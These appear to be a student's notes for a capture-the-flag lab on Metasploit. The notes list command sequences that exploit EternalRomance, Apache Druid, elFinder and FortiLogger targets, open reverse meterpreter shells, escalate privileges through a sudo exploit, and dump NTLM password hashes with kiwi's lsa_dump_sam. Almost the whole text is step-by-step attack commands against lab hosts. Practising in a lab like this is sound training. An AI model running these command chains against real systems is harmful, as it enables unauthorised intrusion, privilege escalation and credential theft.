# Metasploit


Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer


```bash
msf6> earch eternalromance type:exploit
msf6> set LHOST 10.10.14.110
msf6> set RHOST 10.129.197.195
msf6> exploit

meterpreter > cd C:\Users\Administrator\Desktop

meterpreter > cat flag.txt
 
```

Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer. 

```bash 
msf6> search Apache Druid
msf6> use 0
msf6> options
msf6> set LHOST 10.10.14.110
msf6> set RHOST 10.129.203.52
msf6> exploit

meterpreter > cd ..
meterpreter > cat flag.txt
```


# Jobs and sessions -i/-l

```bash

search elFinder
use 3
set LHOST 10.10.14.110
set RHOST 10.129.226.82
exploit

meterpreter > shell
sudo --version

CTR+Z
sessions -l
msf6> search Sudo version 1.8.31
msf6> use 0
msf6> set sessions 4
msf6> set LHOST 10.10.14.110
msf6> set LPORT 4445
msf6> run

meterpreter > shell 
cat /root/flag.txt

```

# hashdump and lsa_dump_sam

Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with? 
Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer. 

```bash

msf6> search FortiLogger
msf6> use 0
msf6> set LHOST 10.10.14.110
msf6> set LPORT 4446
msf6> set RHOSTS 10.129.3.230
msf6> exploit


meterpreter > shell
C:\Windows\system32> whoami

meterpreter > load kiwi
meterpreter > lsa_dump_sam

```

